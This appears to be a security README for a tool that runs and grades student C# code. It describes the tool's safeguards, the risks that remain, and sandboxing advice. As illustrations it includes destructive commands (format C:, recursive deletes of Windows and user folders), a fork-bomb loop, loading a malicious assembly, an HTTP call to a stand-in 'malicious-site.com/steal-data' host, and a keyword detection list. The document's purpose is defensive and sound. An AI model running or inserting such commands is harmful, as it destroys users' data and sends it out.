
# Security When Running Student Code

## ✅ Protections Implemented

### 1. **Timeout Limit**
- Protects against: infinite loops
- Configurable limit in the UI (default: 5 seconds)

### 2. **Memory Limit**
- Protects against: excessive RAM usage, memory bombs
- Limit: **512 MB** per process
- Monitored every 100ms during execution

### 3. **Reduced Process Priority**
- Executed processes run with `BelowNormal` priority
- Minimizes system impact if CPU is heavily used

### 4. **Isolated Working Directory (WorkDir)**
- Each execution uses a separate temporary directory
- Automatically cleaned up after execution
- Student code cannot directly access system files

## ⚠️ Risks NOT Mitigated (Recommendations)

### 1. **File System Access**
**Risk:** Code can read/write/delete files anywhere on the system.

**Malicious example:**
```csharp
File.Delete("C:\\Windows\\System32\\important.dll"); // ❌ DANGEROUS
Directory.Delete("C:\\Users\\Teacher\\Documents", true); // ❌ DANGEROUS
```

**Suggested mitigation:**
- Run in a virtual machine or Docker container
- Use a user account with limited permissions
- Manually review code before execution

### 2. **Network Access**
**Risk:** Code can make HTTP requests, send data, download malware.

**Malicious example:**
```csharp
using var client = new HttpClient();
await client.GetAsync("http://malicious-site.com/steal-data"); // ❌ DANGEROUS
```

**Suggested mitigation:**
- Disconnect network during tests
- Use a firewall to block process network access

### 3. **Spawning Other Processes**
**Risk:** Code can launch other programs.

**Malicious example:**
```csharp
Process.Start("cmd.exe", "/c format C: /y"); // ❌ EXTREMELY DANGEROUS
Process.Start("powershell", "-Command Remove-Item C:\\* -Recurse"); // ❌ DANGEROUS
```

**Suggested mitigation:**
- Run in a sandbox or container
- Manually review code before execution

### 4. **Fork Bombs**
**Risk:** Create processes infinitely until the system crashes.

**Malicious example:**
```csharp
while(true) 
{
    Process.Start("notepad.exe"); // ❌ Fork bomb
}
```

**Mitigation:** Partially covered by timeout and memory limit, but may cause issues before detection.

### 5. **Reflection and Dynamic Code**
**Risk:** Use reflection to execute arbitrary code or access private APIs.

**Malicious example:**
```csharp
Assembly.Load(maliciousBytes); // ❌ Load malicious DLL
Type.GetType("System.Security.SecurityManager").GetMethod("SetSecurity")?.Invoke(...); // ❌
```

## 🛡️ Recommended Best Practices

### Option 1: Virtual Machine
- Run the validator in a VM with snapshots
- Revert snapshot after each grading session
- **Advantage:** Full protection
- **Disadvantage:** Requires more resources

### Option 2: Windows Sandbox
```powershell
# Run in Windows Sandbox (Windows 10 Pro/Enterprise)
WindowsSandbox.exe
```

### Option 3: Docker Container
```dockerfile
FROM mcr.microsoft.com/dotnet/sdk:8.0
WORKDIR /app
# Configure resource limits
```

### Option 4: Manual Code Review
- **Quickly review** code before execution
- Look for: `Process.Start`, `File.Delete`, `HttpClient`, `System.Net`
- Takes ~30 seconds per student

### Option 5: Limited Permission User
```powershell
# Create a non-privileged user to run the validator
net user ValidatorTest password123 /add
# Do not add to any admin group
```

## 📋 Security Checklist

Before using in production:

- [ ] Are you running in a VM or dedicated machine?
- [ ] Have you reviewed student code for `Process.Start`, `File.Delete`, `HttpClient`?
- [ ] Do you have backups of important files?
- [ ] Is the validator running as a non-admin user?
- [ ] Have you tested with your own code first?

## 🔍 Signs of Malicious Code

Look for these keywords in student code:

```
❌ Process.Start
❌ File.Delete
❌ Directory.Delete
❌ HttpClient
❌ WebClient
❌ Socket
❌ Registry
❌ Environment.Exit
❌ Assembly.Load
❌ Reflection
```

If you find any, **review manually** before running.

## Conclusion

The validator has basic protections but **IS NOT A COMPLETE SANDBOX**. For safe production use:

1. **Best option:** Run in VM/Docker
2. **Practical option:** Review code + limited user
3. **Minimal option:** Have backups + be ready to restore the system

**Remember:** No system is 100% secure. Combining multiple layers of protection is the best strategy.
